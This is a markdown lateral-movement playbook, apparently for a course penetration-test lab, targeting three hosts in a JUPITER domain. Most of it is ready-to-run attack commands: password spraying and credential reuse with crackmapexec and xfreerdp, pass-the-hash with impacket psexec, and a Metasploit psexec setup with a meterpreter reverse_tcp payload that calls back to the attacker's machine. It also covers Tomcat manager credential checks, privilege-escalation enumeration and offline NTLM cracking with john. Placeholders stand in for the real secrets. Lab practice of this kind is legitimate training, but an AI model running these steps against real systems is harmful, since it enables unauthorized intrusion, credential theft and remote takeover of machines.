# Credential pivot plan — A_Rocha hosts (`.100` `.101` `.102`)

**Secrets live only in** [`credentials_handoff_SECRETS.md`](credentials_handoff_SECRETS.md) **(gitignored).** This file is safe to commit: use **placeholders** below; paste real passwords / hashes **only in your shell**, never into git.

---

## 0 — Prep (Kali, one terminal)

```bash
echo TM6_afrocha; date
ip -br a    # confirm lab IP for any callback / RDP source if needed

# IPs (short names)
export H101=10.20.160.101
export H100=10.20.160.100
export H102=10.20.160.102

# Open credentials_handoff_SECRETS.md in a second window — copy values as you go.
# Optional: export secrets ONLY for this shell session (still do not log to git):
#   export TRY_PASS='...'     # e.g. GANYMEDE recovered Administrator cleartext
#   export METIS_NT='...'     # 32-hex NTLM for METIS\Administrator (no "NTLM:" prefix)
```

---

## 1 — `10.20.160.101` (CALLISTO) — **highest priority**

### 1a — Confirm ports (adjust if your nmap already has this)

```bash
nmap -Pn -p22,135,139,445,3389,3306,5985 -sV "$H101" -oA ~/scans/nmap_101_pivot
```

### 1b — **RDP** (GANYMEDE password reuse)

Replace **`<GANYMEDE_ADMIN_CLEAR>`** with the **GANYMEDE `administrator` cleartext** from the secrets handoff.

```bash
xfreerdp /v:"$H101" /u:Administrator /p:'<GANYMEDE_ADMIN_CLEAR>' /cert:ignore /dynamic-resolution
```

If that fails, try **`JUPITER\Administrator`** (same password):

```bash
xfreerdp /v:"$H101" /u:'JUPITER\Administrator' /p:'<GANYMEDE_ADMIN_CLEAR>' /cert:ignore /dynamic-resolution
```

### 1c — **SMB** with CrackMapExec (same password)

```bash
crackmapexec smb "$H101" -u Administrator -p '<GANYMEDE_ADMIN_CLEAR>'
crackmapexec smb "$H101" -u 'JUPITER\Administrator' -p '<GANYMEDE_ADMIN_CLEAR>'
```

If you see **`(Pwn3d!)`** or **signed-in SMB`**, follow with **shares** / **lsa** only if **ROE** allows.

### 1d — **Spray METIS / THEBE `DefaultPassword`** strings

Copy the **two `DefaultPassword` plaintexts** from **`credentials_handoff_SECRETS.md`** (METIS row, THEBE row). Spray **SMB** first (faster than RDP):

```bash
crackmapexec smb "$H101" -u Administrator -p '<METIS_DEFAULTPASSWORD>'
crackmapexec smb "$H101" -u administrator -p '<METIS_DEFAULTPASSWORD>'
crackmapexec smb "$H101" -u Administrator -p '<THEBE_DEFAULTPASSWORD>'
crackmapexec smb "$H101" -u administrator -p '<THEBE_DEFAULTPASSWORD>'
```

Then repeat winners (if any) with **`xfreerdp`** as in **1b**.

### 1e — **Pass-the-hash** (METIS or THEBE `Administrator` NTLM)

Use **only** if the course allows **PTH**. The handoff lists **32-character hex** NTLM for **METIS** and **THEBE** `Administrator` (empty password accounts may still have a hash).

**Impacket** (example — replace **`<NTLM_HASH>`** with **METIS** or **THEBE** hash, **no** `:` prefix):

```bash
psexec.py -hashes :<NTLM_HASH> 'JUPITER/Administrator@'"$H101"
# or local style if machine is not treating domain:
psexec.py -hashes :<NTLM_HASH> 'Administrator@'"$H101"
```

**Metasploit** (shape only — set **RHOSTS**, **SMBUser**, **SMBPass** as **`aad3b435b51404eeaad3b435b51404ee:<NTLM>`** for full LM:NT if required by module version):

```text
use exploit/windows/smb/psexec
set RHOSTS 10.20.160.101
set SMBUser Administrator
set SMBPass aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <KALI_LAB_IP>
run
```

### 1f — **MySQL** (after cleartext wins elsewhere)

```bash
mysql --protocol=TCP -h "$H101" -P 3306 -u root -p
# or app user from FTP files / handoff — then:
#   SHOW DATABASES;
```

If you still see **`ERROR 1042`**, the server is doing **reverse DNS** on clients — pivot via **phpMyAdmin** on **80** in a browser, or **MySQL from a shell on the host** after RDP.

### 1g — **WinRM** (if `5985` was open in **1a**)

```bash
crackmapexec winrm "$H101" -u Administrator -p '<GANYMEDE_ADMIN_CLEAR>'
evil-winrm -i "$H101" -u Administrator -p '<GANYMEDE_ADMIN_CLEAR>'
```

---

## 2 — `10.20.160.100` (Windows XP)

### 2a — Ports

```bash
nmap -Pn -p135,139,445,3389 -sV "$H100" -oA ~/scans/nmap_100_pivot
```

### 2b — SMB / RDP (short spray)

Use **the same** **`<GANYMEDE_ADMIN_CLEAR>`** and **`DefaultPassword`** tries as **Step 1**, plus **Guest** / empty only if your **enum** suggests it (XP labs vary):

```bash
crackmapexec smb "$H100" -u Administrator -p '<GANYMEDE_ADMIN_CLEAR>'
crackmapexec smb "$H100" -u Administrator -p '<METIS_DEFAULTPASSWORD>'
xfreerdp /v:"$H100" /u:Administrator /p:'<GANYMEDE_ADMIN_CLEAR>' /cert:ignore
```

### 2c — Legacy SMB (only if instructor explicitly allows **MS08-067**-class modules)

Do **not** run against production. If **ROE** permits, use your course **MSF** module and **document** target **SP** / **lang** first.

---

## 3 — `10.20.160.102` (Linux — not **JUPITER**-joined)

### 3a — **Tomcat manager** (XENA cred reuse — usually fails on LAMPP; fast check)

Set **`U`** / **`P`** from **XENA** **`tomcat`** / **`manager`** rows in the secrets file.

```bash
export U='tomcat'    # or manager / rob — from handoff
export P='<FROM_SECRETS_FILE>'
curl -sI -u "$U:$P" "http://$H102:8080/manager/html"
curl -sI -u "$U:$P" "https://$H102:8443/manager/html"
```

### 3b — **MySQL** on `.102` (only if `nmap` shows **3306** listening externally)

```bash
nmap -Pn -p3306 -sV "$H102"
mysql --protocol=TCP -h "$H102" -P 3306 -u root -p
```

Prefer creds from **your FTP files** on **.101** or **RFI**-readable configs—not random team passwords—unless you confirmed reuse.

### 3c — **SSH** (only if port **22** open)

```bash
nmap -Pn -p22 -sV "$H102"
# ssh user@$H102   # only if a teammate gave a Linux reuse password
```

---

## 4 — After a **Windows** shell (`.101` / `.100`) — priv esc checklist

```text
whoami /groups
systeminfo
net user
net localgroup administrators
# Unquoted paths / weak service perms / token abuse — per rubric and ROE
```

If you are **`JUPITER\`** user:

```text
net group "domain admins" /domain
net group "enterprise admins" /domain
```

---

## 5 — Optional: crack **NTLM** offline (METIS/THEBE **Administrator**)

Only on **lab** hashes you are authorized to attack.

```bash
echo '<NTLM_HASH>' > ~/hashes/metis_admin.ntlm
john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt ~/hashes/metis_admin.ntlm
# or hashcat -m 1000 ...
```

If **John** cracks it, return to **steps 1b–1c** with the **cleartext**.

---

## How the deck maps to lateral movement

| Teammate lane | Idea you can reuse on your IPs |
|---------------|----------------------------------|
| **GANYMEDE (.125)** | **Product ≠ banner** (WeOnlyDo vs FreeSSHd) → fingerprint **actual product**, not a substring of the SSH banner. |
| **GANYMEDE post-ex** | **SYSTEM** on **JUPITER** member → **LSA / SAM / MSCache** → **reuse** cleartext + **crack** hashes → **CALLISTO (.101)** **RDP/SMB**. |
| **METIS / THEBE** | **DC `DefaultPassword`** + **`Administrator` NTLM`** → **spray** / **PTH** onto **workstations**. |
| **XENA (.111)** | **Tomcat / Bitnami** → quick **curl** to **`.102:8080`** **manager** (likely negative on **LAMPP**). |

---

## Hygiene

- Re-type secrets from **`credentials_handoff_SECRETS.md`** into commands **locally**; do not paste into **Slack** / **GitHub issues**.  
- When a spray works, **screenshot** + **`101-NNN` / `100-NNN`** naming; update this doc with **“works: method + user”** only — **not** the password.
